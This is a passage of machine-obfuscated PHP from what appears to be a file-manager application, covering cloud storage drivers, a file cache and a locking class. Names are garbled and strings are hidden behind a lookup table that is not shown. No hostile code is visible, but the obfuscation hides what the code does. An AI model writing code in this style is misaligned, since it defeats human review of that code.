$¥Ôêîã¦); $‹ÜãšÚï .= fread($“±›¥öé, $¥Ôêîã¦); fclose($“±›¥öé); return md5($‹ÜãšÚï) . $Ìİ‘·´; } public function getContent($¡š¤ä†‚) { $¡š¤ä†‚ = $this->iconvSystem($¡š¤ä†‚); return file_get_contents($¡š¤ä†‚); } public function setContent($àÄïŸÑã, $éÛË…ŒÛ = '') { $àÄïŸÑã = $this->iconvSystem($àÄïŸÑã); $‘Ğá²æÌ = @file_put_contents($àÄïŸÑã, $éÛË…ŒÛ, LOCK_EX); clearstatcache(); @chmod($àÄïŸÑã, $this->pathAuth); return $‘Ğá²æÌ === !1 ? !1 : !0; } public function fileSubstr($¨Ë£ŞŞù, $œ¾Ä¶ƒ = 0, $ã§¼èú® = false) { $ä‹Ôè =& $_SERVER[ò«¥Ê‡å]; $¨Ë£ŞŞù = $this->iconvSystem($¨Ë£ŞŞù); if ($ã§¼èú® === !1) { $ã§¼èú® = $this->size($¨Ë£ŞŞù); } if ($ã§¼èú® <= 0) { return $ä‹Ôè[12]; } $“º§¡Õ… = fopen($¨Ë£ŞŞù, $ä‹Ôè[1414]); if (!$“º§¡Õ…) { return !1; } fseek_64($“º§¡Õ…, $œ¾Ä¶ƒ); $À¼„€„İ = fread($“º§¡Õ…, $ã§¼èú®); fclose($“º§¡Õ…); return $À¼„€„İ; } public function upload($Ëè±¸³¶, $µßÄÈøÂ, $‚õÀÈùş = false, $§ı­Ğ•² = REPEAT_REPLACE) { if ($‚õÀÈùş) { return $this->moveFile($µßÄÈøÂ, $Ëè±¸³¶); } return $this->copyFile($µßÄÈøÂ, $Ëè±¸³¶); } public function setModifyTime($ÑË•°ƒ¬, $¶€õ¿–ê = '') { @touch($ÑË•°ƒ¬, intval($¶€õ¿–ê)); } public function download($üŒ„×²È, $÷ÒÀ«) { return $this->iconvSystem($üŒ„×²È); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($›Öñ•À) { parent::__construct($›Öñ•À); $this->signatureVersion($_SERVER[ò«¥Ê‡å][233]); } public function fileOutImage($Ğªù¬€—, $ÍÕ³êÁ = 250) { $»Ù˜ÕÒ‹ =& $_SERVER[ò«¥Ê‡å]; if ($this->size($Ğªù¬€—) > 1024 * 1024 * 25) { return $this->fileOutImageServer($Ğªù¬€—, $ÍÕ³êÁ); } $ûõŒ…É = array($»Ù˜ÕÒ‹[1415] => $»Ù˜ÕÒ‹[1416] . $ÍÕ³êÁ . $»Ù˜ÕÒ‹[1417]); $ª½úÈ—í = $this->link($Ğªù¬€—, $ûõŒ…É); $this->fileOutLink($ª½úÈ—í); } public function fileOutLink($¥ûˆùõ) { $¬–Ìß¬ø =& $_SERVER[ò«¥Ê‡å]; if (substr($¥ûˆùõ, 0, 7) == $¬–Ìß¬ø[1378]) { $¥ûˆùõ = $¬–Ìß¬ø[1379] . substr($¥ûˆùõ, 7); } header($¬–Ìß¬ø[164] . $¥ûˆùõ); die; } } goto a­º»º†‚Ş; AÈìêÍÒÌ½: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($˜”äÚ“×, $“ÏÒ¼Å˜) { $Æ¦ÌË®È =& $_SERVER[ò«¥Ê‡å]; $this->cachePath = $˜”äÚ“×[$Æ¦ÌË®È[86]]; $this->prefix = $Æ¦ÌË®È[881]; $this->cacheTime = $“ÏÒ¼Å˜; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¼Ììó¢Œ) { $„™³¾ò =& $_SERVER[ò«¥Ê‡å]; $¼Ììó¢Œ = str_replace(array($„™³¾ò[882], $„™³¾ò[99], $„™³¾ò[75]), $„™³¾ò[883], $¼Ììó¢Œ); return $this->cachePath . $„™³¾ò[884] . $¼Ììó¢Œ . $„™³¾ò[885]; } public function set($ÙÀ¢áÜ«, $Ü¡’ÌŒ , $ë¡¥ş×¡ = false) { $ë¡¥ş×¡ = $ë¡¥ş×¡ ? $ë¡¥ş×¡ : $this->cacheTime; $âÄ‡ï™ = $this->getFile($ÙÀ¢áÜ«); if (file_put_contents($âÄ‡ï™, $this->prefix . $Ü¡’ÌŒ , LOCK_EX)) { @touch($âÄ‡ï™, intval(time() + $ë¡¥ş×¡)); clearstatcache(); return !0; } @unlink($âÄ‡ï™); return !1; } public function get($×½Â©ˆí) { $¼ûµø = $this->getFile($×½Â©ˆí); if (file_exists($¼ûµø) && filemtime($¼ûµø) < time()) { @unlink($¼ûµø); return !1; } $ì‘î§å› = @file_get_contents($¼ûµø); return substr($ì‘î§å›, strlen($this->prefix)); } public function remove($ŞÖ¾œÜŒ) { $Úû¼ş›Ğ = $this->getFile($ŞÖ¾œÜŒ); return @unlink($Úû¼ş›Ğ); } public function deleteAll() { $€ˆÇàñ– =& $_SERVER[ò«¥Ê‡å]; $å¯•ƒÎ = scandir($this->cachePath); foreach ($å¯•ƒÎ as $¶‡»‰¼Ì) { $ˆÍÌÌİ = $this->cachePath . $¶‡»‰¼Ì; if (strpos($ˆÍÌÌİ, $€ˆÇàñ–[885]) && strpos($ˆÍÌÌİ, $€ˆÇàñ–[886])) { @unlink($ˆÍÌÌİ); } } } public function clearTimeout() { $–ıŒ†¤€ =& $_SERVER[ò«¥Ê‡å]; $Â“¾–œú = scandir($this->cachePath); foreach ($Â“¾–œú as $·îØíİ‘) { $¼¾½æÁ§ = $this->cachePath . $·îØíİ‘; if (strpos($¼¾½æÁ§, $–ıŒ†¤€[885]) && strpos($¼¾½æÁ§, $–ıŒ†¤€[886]) && filemtime($¼¾½æÁ§) < time()) { @unlink($¼¾½æÁ§); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $ÒøŸä½É =& $_SERVER[ò«¥Ê‡å]; if (self::$handle) { return self::$handle; } $£ªË ı» = $GLOBALS[$ÒøŸä½É[6]][$ÒøŸä½É[395]]; self::$timeout = $£ªË ı»[$ÒøŸä½É[887]] ? $£ªË ı»[$ÒøŸä½É[887]] : 10; $—îØËĞÔ = _get($GLOBALS[$ÒøŸä½É[6]], $ÒøŸä½É[888]); $«ƒÂ’´Ì = $£ªË ı»[$ÒøŸä½É[873]] ? $£ªË ı»[$ÒøŸä½É[873]] : $ÒøŸä½É[216]; if ($«ƒÂ’´Ì == $ÒøŸä½É[21] && $—îØËĞÔ == $ÒøŸä½É[13]) { $«ƒÂ’´Ì = $ÒøŸä½É[216]; } switch ($«ƒÂ’´Ì) { case $ÒøŸä½É[876]: self::$handle = new CacheLockRedis(); break; case $ÒøŸä½É[877]: self::$handle = new CacheLockMemcached(); break; case $ÒøŸä½É[21]: self::$handle = new CacheLockDatabase(); break; case $ÒøŸä½É[216]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($ÒøŸä½É[889], $ÒøŸä½É[890]); } return self::$handle; } private static function key($ò´Åå ) { return $_SERVER[ò«¥Ê‡å][891] . Cache::key($ò´Åå ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($†ßØÇæ³ = '') { self::$errorMsg = $†ßØÇæ³; } public static function lockGlobal($÷®èóø, $†Å’‚ƒ) { return self::lock($÷®èóø, $†Å’‚ƒ, !0); } public static function lock($€»£ú½ì, $×—ò³ï = false, $áÓÁÙñ’ = false) { $£ç¾Â…ç =& $_SERVER[ò«¥Ê‡å]; $àúó¨Õ = self::init(); $Òğâ’­¾ = self::key($€»£ú½ì); $×—ò³ï = $×—ò³ï ? $×—ò³ï : self::$timeout; $è¥ìÁÛÄ = timeFloat(); $ÑĞƒ¤¨ = $àúó¨Õ->lock($Òğâ’­¾, $×—ò³ï); $Ïñ½Äàö = timeFloat(); if (!$ÑĞƒ¤¨) { $ìç“«’× = "\x6c\x6f\x63\x6b\40\145\x72\162\157\162\73\153\x65\171\x3d{$€»£ú½ì}\x3b\164\x69\x6d\145\x3d{$×—ò³ï}\x3b" . self::$errorMsg . $£ç¾Â…ç[73] . get_caller_msg(); $Òª…ß› = LNG($£ç¾Â…ç[892]) . "\50{$×—ò³ï}\x73\x29\56" . LNG($£ç¾Â…ç[893]); $Òª…ß› .= $£ç¾Â…ç[894]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Òª…ß› = $Òª…ß› . $£ç¾Â…ç[895] . self::$errorMsg; } write_log($£ç¾Â…ç[896] . sprintf($£ç¾Â…ç[897], timeFloat() - $è¥ìÁÛÄ) . $£ç¾Â…ç[898] . $ìç“«’× . $£ç¾Â…ç[899] . error_get_last(), $£ç¾Â…ç[890]); show_json($Òª…ß›, !1); } if (!$áÓÁÙñ’) { self::$lockItem[$Òğâ’­¾] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $®´ã’Ş‘ = number_format(timeFloat() - $Ïñ½Äàö, 3); write_log($£ç¾Â…ç[900] . $€»£ú½ì . $£ç¾Â…ç[901] . $®´ã’Ş‘, $£ç¾Â…ç[890]); } return $ÑĞƒ¤¨; } public static function lockGet($‚±°¯¦Ü) { $óçşÏÀ = self::key($‚±°¯¦Ü); if (self::$lockItem[$óçşÏÀ]) { return self::$lockItem[$óçşÏÀ]; } return self::init()->lockGet($óçşÏÀ); } public static function unlock($ÏßÆíÁÙ) { $®è££€Ó =& $_SERVER[ò«¥Ê‡å]; $‡‹°Ü = self::key($ÏßÆíÁÙ); self::$lockItem[$‡‹°Ü] = null; self::init()->unlock($‡‹°Ü); if (GLOBAL_DEBUG_LOG_ALL) { write_log($®è££€Ó[902] . $ÏßÆíÁÙ, $®è££€Ó[890]); } return; } public static function unlockRuntime() { $§ùÌëÏÆ =& $_SERVER[ò«¥Ê‡å]; $èÛİÚÅ = self::init(); $·È‰Ìëº = !1; foreach (self::$lockItem as $„æŸ¥Â => $˜†ÖÂè») { if (!$˜†ÖÂè») { continue; } $èÛİÚÅ->unlock($„æŸ¥Â); if (!$·È‰Ìëº) { $·È‰Ìëº = !0; write_log($§ùÌëÏÆ[903] . $„æŸ¥Â . $§ùÌëÏÆ[73] . get_caller_msg(), $§ùÌëÏÆ[890]); continue; } write_log($§ùÌëÏÆ[903] . $„æŸ¥Â, $§ùÌëÏÆ[890]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $£×€ĞÌ½ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($§ùÌëÏÆ[904] . $£×€ĞÌ½ . $§ùÌëÏÆ[905] . ACTION, $§ùÌëÏÆ[890]); } } public static function fileLock($¾¸©¾Šù) { $Î³î™¾¶ =& $_SERVER[ò«¥Ê‡å]; if (!$GLOBALS[$Î³î™¾¶[906]]) { $GLOBALS[$Î³î™¾¶[906]] = array(); } $GLOBALS[$Î³î™¾¶[906]][$¾¸©¾Šù] = !1; $…ÇÙ®ö = fopen(DATA_PATH . $¾¸©¾Šù . $Î³î™¾¶[907], $Î³î™¾¶[908]); if (!$…ÇÙ®ö) { return !1; } $GLOBALS[$Î³î™¾¶[906]][$¾¸©¾Šù] = $…ÇÙ®ö; if (flock($…ÇÙ®ö, LOCK_EX)) { return !0; } self::unlock($¾¸©¾Šù); show_json($Î³î™¾¶[909], !1); return !1; } public static function fileUnlock($¼Šî“µò) { $òÖ¯¯Á  =& $_SERVER[ò«¥Ê‡å]; $µ›éÇÛ¡ = $GLOBALS[$òÖ¯¯Á [906]][$¼Šî“µò]; if (!$µ›éÇÛ¡) { return; } $GLOBALS[$òÖ¯¯Á [906]][$¼Šî“µò] = !1; flock($µ›éÇÛ¡, LOCK_UN); fclose($µ›éÇÛ¡); } public static function fileUnlockAll() { $Çı˜š• =& $_SERVER[ò«¥Ê‡å]; if (!$GLOBALS[$Çı˜š•[906]]) { return; } foreach ($GLOBALS[$Çı˜š•[906]] as $Ì•ÁÑÓ => $–„àŒÃÊ) { if (!$–„àŒÃÊ) { continue; } $GLOBALS[$Çı˜š•[906]][$Ì•ÁÑÓ] = !1; flock($–„àŒÃÊ, LOCK_UN); fclose($–„àŒÃÊ); } $GLOBALS[$Çı˜š•[906]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto cÌ¯¹…; CÃŒ©ˆš¬É: class PathDriverBOS extends PathDriverBaseS3 { public function __construct($ÁÚÛØŒğ) { parent::__construct($ÁÚÛØŒğ); } public function getHost() { $™ØÕ¨óÇ =& $_SERVER[ò«¥Ê‡å]; $Äò›ò“ = str_rtrim(parent::getHost(), $™ØÕ¨óÇ[8] . $this->bucket); $Äò›ò“ = explode($™ØÕ¨óÇ[200], $Äò›ò“); return $Äò›ò“[0] . $™ØÕ¨óÇ[200] . $this->bucket . $™ØÕ¨óÇ[1371] . $Äò›ò“[1]; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($êıÒ½¯) { parent::__construct($êıÒ½¯); $this->signatureVersion($_SERVER[ò«¥Ê‡å][233]); } public function uploadFormData($›Ñ¸Ş¡Ÿ, $ÙĞá¥Ó” = 3600) { $ÓªŠÔš =& $_SERVER[ò«¥Ê‡å]; $èˆã¶•¦ = $ÓªŠÔš[215]; $Œâ±ªéÇ = $ÓªŠÔš[249]; $Ñºù¹Ì± = $ÓªŠÔš[259]; $³ÑµĞ¡› = gmdate($ÓªŠÔš[1372], time() + $ÙĞá¥Ó”); $œ»¨‰Û· = (string) time() . $ÓªŠÔš[73] . (string) (time() + $ÙĞá¥Ó”); $º­úûÀû = array($ÓªŠÔš[260] => $³ÑµĞ¡›, $ÓªŠÔš[263] => array(array($ÓªŠÔš[265] => $èˆã¶•¦), array($ÓªŠÔš[264] => $this->bucket), array($ÓªŠÔš[266], $ÓªŠÔš[267], $ÓªŠÔš[12]), array($ÓªŠÔš[270] => $Ñºù¹Ì±), array($ÓªŠÔš[1373] => $Œâ±ªéÇ), array($ÓªŠÔš[1374] => $this->accessKey), array($ÓªŠÔš[1375] => $œ»¨‰Û·))); $º­úûÀû = json_encode($º­úûÀû); $¡€Š—’• = hash_hmac($ÓªŠÔš[249], $œ»¨‰Û·, $this->secret); $ƒˆ“şê = sha1($º­úûÀû); $¢Ğ¾ÁŒ‰ = hash_hmac($ÓªŠÔš[249], $ƒˆ“şê, $¡€Š—’•); $ôæ—Ñö = array($ÓªŠÔš[265] => $èˆã¶•¦, $ÓªŠÔš[270] => $Ñºù¹Ì±, $ÓªŠÔš[278] => base64_encode($º­úûÀû), $ÓªŠÔš[1373] => $Œâ±ªéÇ, $ÓªŠÔš[1374] => $this->accessKey, $ÓªŠÔš[1376] => $œ»¨‰Û·, $ÓªŠÔš[1377] => $¢Ğ¾ÁŒ‰, $ÓªŠÔš[198] => $this->getHost()); return $ôæ—Ñö; } public function fileOutLink($”·çÊâª) { $íÈ›‰±ò =& $_SERVER[ò«¥Ê‡å]; if (substr($”·çÊâª, 0, 7) == $íÈ›‰±ò[1378]) { $”·çÊâª = $íÈ›‰±ò[1379] . substr($”·çÊâª, 7); } header($íÈ›‰±ò[164] . $”·çÊâª); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($şÉúÆ ) { $this->pathParse = $şÉúÆ ; $this->model = Model($_SERVER[ò«¥Ê‡å][1380]); } public function getPath($™Å˜§Ç) { return trim($™Å˜§Ç, $_SERVER[ò«¥Ê‡å][8]); } public function pathFather($İŒ²âµÒ) { $ÄÅŞ£ş¿ = $this->parse($İŒ²âµÒ); $ÄÅŞ£ş¿ = $this->infoSimple($İŒ²âµÒ); return $ÄÅŞ£ş¿ ? $ÄÅŞ£ş¿[$_SERVER[ò«¥Ê‡å][182]] : !1; } public function pathThis($Œ¨„ù¶Ì) { $Çñ‹Ä¯Ş = $this->infoSimple($Œ¨„ù¶Ì); return $Çñ‹Ä¯Ş ? $Çñ‹Ä¯Ş[$_SERVER[ò«¥Ê‡å][32]] : !1; } public function getPathOuter($È›Ÿˆ) { if (!$È›Ÿˆ) { return $È›Ÿˆ; } $îÚùŸ œ = $this->parse($È›Ÿˆ); return KodIO::make($îÚùŸ œ[$_SERVER[ò«¥Ê‡å][445]]); } public function copyFolderFromIO($°ÌÚ´ä, $¬ÇëõÛÎ, $¼Ä¡š”Å, $•—Óá­, $›É¼Åº¿) { $óÑ¾êŞŠ = $this->model->copyFolderFromIO($°ÌÚ´ä, $¬ÇëõÛÎ, $¼Ä¡š”Å, $•—Óá­, $›É¼Åº¿); return KodIO::make($óÑ¾êŞŠ); } public function isParentOf($÷¢«Í¨ƒ, $Ä¶Ô‘¡Ö) { return $this->model->isParentOf($÷¢«Í¨ƒ, $Ä¶Ô‘¡Ö); } public function mkfile($ÓÂŠ•§É, $‹Œ›ø = '', $î©àãŠ = REPEAT_RENAME) { $ì­Òµ·Ú =& $_SERVER[ò«¥Ê‡å]; $£êŞŒŸ’ = $this->parse($ÓÂŠ•§É); $ÓÂŠ•§É = $£êŞŒŸ’[$ì­Òµ·Ú[445]]; for ($¢Ÿ¯¢ø‹ = 0; $¢Ÿ¯¢ø‹ < count($£êŞŒŸ’[$ì­Òµ·Ú[1381]]); $¢Ÿ¯¢ø‹++) { $ã¾Ãç  = $£êŞŒŸ’[$ì­Òµ·Ú[1381]][$¢Ÿ¯¢ø‹]; if ($¢Ÿ¯¢ø‹ == count($£êŞŒŸ’[$ì­Òµ·Ú[1381]]) - 1) { $ÓÂŠ•§É = $this->model->mkfile($ÓÂŠ•§É, $ã¾Ãç , $‹Œ›ø, $î©àãŠ); break; } $ÓÂŠ•§É = $this->model->mkdir($ÓÂŠ•§É, $ã¾Ãç , REPEAT_SKIP); } return $this->getPathOuter($ÓÂŠ•§É); } public function mkdir($ÊÃÄ‹Œ, $ëğæ™ÅÀ = REPEAT_SKIP) { $Š£¿¤ùĞ =& $_SERVER[ò«¥Ê‡å]; $¯ˆ‰šğ = $this->parse($ÊÃÄ‹Œ); $ÊÃÄ‹Œ = $¯ˆ‰šğ[$Š£¿¤ùĞ[445]]; for ($–´•ŞÆ¢ = 0; $–´•ŞÆ¢ < count($¯ˆ‰šğ[$Š£¿¤ùĞ[1381]]); $–´•ŞÆ¢++) { $Ä‚¹Ü¿Ø = $¯ˆ‰šğ[$Š£¿¤ùĞ[1381]][$–´•ŞÆ¢]; $ÊÃÄ‹Œ = $this->model->mkdir($ÊÃÄ‹Œ, $Ä‚¹Ü¿Ø, $ëğæ™ÅÀ); } return $this->getPathOuter($ÊÃÄ‹Œ); } public function copyFile($½¡¿ï›, $šèÜõş, $Ûí±ÕíÌ = REPEAT_REPLACE) { $¤èÄè =& $_SERVER[ò«¥Ê‡å]; $Ò¸˜ äù = $this->parse($šèÜõş); $Ìú»™ØØ = $this->model->copy($½¡¿ï›, $Ò¸˜ äù[$¤èÄè[445]], $Ûí±ÕíÌ, $Ò¸˜ äù[$¤èÄè[86]]); return $Ìú»™ØØ ? $this->getPathOuter($Ìú»™ØØ) : !1; } public function moveFile($ëÚŸÈä, $¸Ã†úš, $ŸÑç‚Òî = REPEAT_REPLACE) { $ëÙÆìÎñ =& $_SERVER[ò«¥Ê‡å]; $ØŠïš˜ô = $this->parse($¸Ã†úš); $Œ·Â¬Œ = $this->model->move($ëÚŸÈä, $ØŠïš˜ô[$ëÙÆìÎñ[445]], $ŸÑç‚Òî, $ØŠïš˜ô[$ëÙÆìÎñ[86]]); return $Œ·Â¬Œ ? $this->getPathOuter($Œ·Â¬Œ) : !1; } public function copy($ù¡ÃŸµŞ, $‰£Ã÷, $øã›†’š = REPEAT_REPLACE, $¢­Îëø¼ = false) { $ÔÛŠ¢¦˜ = $this->parse($‰£Ã÷); $”æ»—Ò¦ = $this->model->copy($ù¡ÃŸµŞ, $ÔÛŠ¢¦˜[$_SERVER[ò«¥Ê‡å][445]], $øã›†’š, $¢­Îëø¼); return $”æ»—Ò¦ ? $this->getPathOuter($”æ»—Ò¦) : !1; } public function moveSameAllow() { } public function move($¬ØÄ§âç, $½³¶À, $Ú“ÔóÖ° = REPEAT_REPLACE, $÷Ò¨Â¦Ê = false) { $óæñíàı = $this->parse($½³¶À); $Ó§…¡Çû = $this->model->move($¬ØÄ§âç, $óæñíàı[$_SERVER[ò«¥Ê‡å][445]], $Ú“ÔóÖ°, $÷Ò¨Â¦Ê); return $Ó§…¡Çû ? $this->getPathOuter($Ó§…¡Çû) : !1; } public function remove($ÊÙª²¨, $Ñ÷üä = true) { return $this->model->remove($ÊÙª²¨, $Ñ÷üä); } public function rename($Â®æØ™, $ËÀÚŒÚ·) { $àÅš¢šÃ = $this->model->rename($Â®æØ™, $ËÀÚŒÚ·); return $àÅš¢šÃ ? $this->getPathOuter($Â®æØ™) : $àÅš¢šÃ; } public function size($úü÷ôÀ) { $à™ˆê˜« = $this->infoSimple($úü÷ôÀ); return $à™ˆê˜« ? $à™ˆê˜«[$_SERVER[ò«¥Ê‡å][78]] : 0; } public function infoSimple($÷ù»ˆÙ¥) { return $this->model->sourceInfo($÷ù»ˆÙ¥); } public function info($Ôœñóªâ) { return $this->infoParse($Ôœñóªâ); } public function infoAuth($Õ¯îóâÎ) { return $this->infoParse($Õ¯îóâÎ, !1, !0); } public function infoWithChildren($’´¥¹ö÷) { return $this->infoParse($’´¥¹ö÷, !0); } protected function infoParse($Æùœõ‰, $¸­Éú¤ = false, $Ú»™‡¦¡ = false) { if (!$¸­Éú¤) { return $this->model->pathInfo($Æùœõ‰, $Ú»™‡¦¡); } return $this->model->pathInfoMore($Æùœõ‰); } public function infoFullSimple($³£èµ”î) { $˜ı¢¨·º =& $_SERVER[ò«¥Ê‡å]; $ÁÊïöı  = explode($˜ı¢¨·º[8], $³£èµ”î); $ºÒ½Âœê = implode($˜ı¢¨·º[8], array_splice($ÁÊïöı , 1)); return $this->model->pathInfoByPath($ÁÊïöı [0], $ºÒ½Âœê); } public function infoFull($öÛ—Îí¯) { $³šÆÔñæ = $this->infoFullSimple($öÛ—Îí¯); return is_array($³šÆÔñæ) ? $this->model->pathInfo($³šÆÔñæ[$_SERVER[ò«¥Ê‡å][183]]) : !1; } public function hashSimple($ì†¤Á) { $œ‡íë Ó =& $_SERVER[ò«¥Ê‡å]; $õÀ“İüç = $this->infoWithChildren($ì†¤Á); return $õÀ“İüç[$œ‡íë Ó[519]][$œ‡íë Ó[642]]; } public function hashMd5($¢×òÜ) { $øêç¡» =& $_SERVER[ò«¥Ê‡å]; $¼§Ùşç© = $this->infoWithChildren($¢×òÜ); return $¼§Ùşç©[$øêç¡»[519]][$øêç¡»[517]]; } public function exist($Ë„€‚í¯) { $ı³Ü…Ãı =& $_SERVER[ò«¥Ê‡å]; $şŸµÛ¨« = $this->parse($Ë„€‚í¯); if (!$şŸµÛ¨«[$ı³Ü…Ãı[86]]) { return $this->isFile($Ë„€‚í¯) || $this->isFolder($Ë„€‚í¯); } $àºà×ú‘ = array($ı³Ü…Ãı[447] => $şŸµÛ¨«[$ı³Ü…Ãı[445]], $ı³Ü…Ãı[32] => $şŸµÛ¨«[$ı³Ü…Ãı[86]]); $³Ãìœ İ = $this->model->where($àºà×ú‘)->find(); return $³Ãìœ İ ? !0 : !1; } public function isFile($…’èçúû) { $šææ¿”Â =& $_SERVER[ò«¥Ê‡å]; $”Ô÷•ÑÒ = $this->infoSimple($…’èçúû); return $”Ô÷•ÑÒ && $”Ô÷•ÑÒ[$šææ¿”Â[455]] == $šææ¿”Â[214] ? !0 : !1; } public function isFolder($áÒÒ²ãŸ) { $ŸÃñàØ =& $_SERVER[ò«¥Ê‡å]; $Âéšë°Ñ = $this->infoSimple($áÒÒ²ãŸ); return $Âéšë°Ñ && $Âéšë°Ñ[$ŸÃñàØ[455]] == $ŸÃñàØ[90] ? !0 : !1; } public function listPath($õåŠÊ¶à, $™¤âúé¨ = false) { $Å¥Ö­Û =& $_SERVER[ò«¥Ê‡å]; if ($õåŠÊ¶à == $Å¥Ö­Û[12]) { return !1; } $ºŒ©£äÎ = array($Å¥Ö­Û[447] => $õåŠÊ¶à); if ($™¤âúé¨) { return $this->model->listSource($ºŒ©£äÎ, -1); } return $this->model->listSource($ºŒ©£äÎ); } public function has($şê˜ÂÔÔ, $²Ì“ü×¤ = false, $Àï §œ‘ = null) { $ôæ³†¹Õ =& $_SERVER[ò«¥Ê‡å]; $Ó°§ÅÀ = $this->infoWithChildren($şê˜ÂÔÔ); if ($²Ì“ü×¤) { return array($ôæ³†¹Õ[226] => $Ó°§ÅÀ[$ôæ³†¹Õ[226]], $ôæ³†¹Õ[225] => $Ó°§ÅÀ[$ôæ³†¹Õ[225]]); } return $Àï §œ‘ ? $Ó°§ÅÀ[$ôæ³†¹Õ[226]] : $Ó°§ÅÀ[$ôæ³†¹Õ[225]]; } public function listAll($ÓíéÇÂ–) { $ô§¿ÑÅ = IO::info($this->pathParse[$_SERVER[ò«¥Ê‡å][86]]); if (!$ô§¿ÑÅ) { return array(); } return $this->model->listAll($ÓíéÇÂ–); } public function getContent($ ¨ºÖß¡) { return $this->model->getContent($ ¨ºÖß¡); } public function setContent($¹¸üÌ–Æ, $œ§æóÍ¾ = '') { return $this->model->setContent($¹¸üÌ–Æ, $œ§æóÍ¾); } public function fileSubstr($´“—ş²õ, $Í·»Õâé, $»üµÛç´) { return $this->model->fileSubstr($´“—ş²õ, $Í·»Õâé, $»üµÛç´); } public function download($ÊìÀØşÄ, $Ã»§ºÑ° = '') { $ó½®Üñî = get_path_father($Ã»§ºÑ°); $ïé¹»š„ = get_path_this($Ã»§ºÑ°); $ÒûåñÖ = $this->model->fileInfoGet($ÊìÀØşÄ); $ÅØÊÃÌ“ = IO::copy($ÒûåñÖ[$_SERVER[ò«¥Ê‡å][86]], $ó½®Üñî, !1, $ïé¹»š„); return $ÅØÊÃÌ“; } public function setModifyTime($‚ûÆœÌ†, $Ü³šğÁÛ = '') { $ê‡ïÃÅ¶ =& $_SERVER[ò«¥Ê‡å]; if (!$‚ûÆœÌ†) { return; } $this->model->where(array($ê‡ïÃÅ¶[461] => $‚ûÆœÌ†))->save(array($ê‡ïÃÅ¶[87] => $Ü³šğÁÛ)); } public function upload($íÎãÛ®, $ú´Ÿ¯³Ü, $Áòœğ‚å = false, $ÛÃşä§¹ = REPEAT_REPLACE) { $²†ÜÕêÚ =& $_SERVER[ò«¥Ê‡å]; $ûÀÁç = $this->parse($íÎãÛ®); $µù’œ‰¦ = $this->model->addFile($ûÀÁç[$²†ÜÕêÚ[445]], $ú´Ÿ¯³Ü, $ûÀÁç[$²†ÜÕêÚ[86]], $Áòœğ‚å, $ÛÃşä§¹); return $this->getPathOuter($µù’œ‰¦); } public function uploadFileByID($™ÌçÕâÚ, $İ˜ˆİË’, $¡›àá§Û) { $ÏÎÅˆ‹ =& $_SERVER[ò«¥Ê‡å]; $ïÜÃ§¹± = $this->parse($™ÌçÕâÚ); $­€§É’ø = $this->model->addFileByFileID($ïÜÃ§¹±[$ÏÎÅˆ‹[445]], $İ˜ˆİË’, $ïÜÃ§¹±[$ÏÎÅˆ‹[86]], $¡›àá§Û); return $this->getPathOuter($­€§É’ø); } public function addFileByRemote($êßàéğ¬, $±ûò »Ç, $îŠŸõ˜ñ = array(), $¢Ã¥¢¨’ = '', $€×¼·ÊÓ) { $ášÂò¼ =& $_SERVER[ò«¥Ê‡å]; $È„Ìçöš = $this->parse($êßàéğ¬); $¢Ã¥¢¨’ = empty($¢Ã¥¢¨’) ? $È„Ìçöš[$ášÂò¼[86]] : $¢Ã¥¢¨’; $Ë£ËÔ› = $this->model->addFileByRemote($È„Ìçöš[$ášÂò¼[445]], $±ûò »Ç, $¢Ã¥¢¨’, $îŠŸõ˜ñ, $€×¼·ÊÓ); return $this->getPathOuter($Ë£ËÔ›); } public function uploadLink($ç¬‹•ì½, $˜’›Ó = 0) { $ïÍİ­‚¤ =& $_SERVER[ò«¥Ê‡å]; $Øñ‘ñ¡¶ = $this->parse($ç¬‹•ì½); $€È¥’Ğ– = _get($GLOBALS[$ïÍİ­‚¤[7]], $ïÍİ­‚¤[1382]); $Ñ®«­Ôû = _get($GLOBALS[$ïÍİ­‚¤[7]], $ïÍİ­‚¤[1383]); $ç¬‹•ì½ = Model($ïÍİ­‚¤[644])->createFileName($Øñ‘ñ¡¶[$ïÍİ­‚¤[86]], $€È¥’Ğ–, $Ñ®«­Ôû); return IO::uploadLink($ç¬‹•ì½, $˜’›Ó); } public function fileNameAuto($‹ÛÑĞ×’, $¾¬­»Ã, $äÄŠ¦£© = REPEAT_REPLACE, $ÅÙÄÊ“¿ = false) { return $this->model->fileNameAuto($‹ÛÑĞ×’, $¾¬­»Ã, $äÄŠ¦£©, $ÅÙÄÊ“¿); } public function fileNameExist($°®Ó¢, $Ç–Œñ) { return $this->model->fileNameExist($°®Ó¢, $Ç–Œñ); } protected function _fileOut($ŒŸ…Ì¬, $ÖšËü³ß = false, $ĞŞ˜æçÚ = false, $åŠ¿Ä‰¬ = '', $‹ÃşÛ·ñ = false) { $ïŞ¤ÔÎµ =& $_SERVER[ò«¥Ê‡å]; $å°ºˆ¹É = $this->model->sourceInfo($ŒŸ…Ì¬); if ($å°ºˆ¹É[$ïŞ¤ÔÎµ[455]] == $ïŞ¤ÔÎµ[90]) { header($ïŞ¤ÔÎµ[1384]); die; } $ûï‡Âõ = $this->model->fileInfoGet($ŒŸ…Ì¬); $åŠ¿Ä‰¬ = $ûï‡Âõ[$ïŞ¤ÔÎµ[517]] ? $ûï‡Âõ[$ïŞ¤ÔÎµ[517]] : $åŠ¿Ä‰¬; $¯“»œÅ = is_array($GLOBALS[$ïŞ¤ÔÎµ[171]]) ? $GLOBALS[$ïŞ¤ÔÎµ[171]][$ïŞ¤ÔÎµ[32]] : $å°ºˆ¹É[$ïŞ¤ÔÎµ[32]]; if ($‹ÃşÛ·ñ) { return IO::fileOutServer($ûï‡Âõ[$ïŞ¤ÔÎµ[86]], $ÖšËü³ß, $¯“»œÅ, $åŠ¿Ä‰¬); } 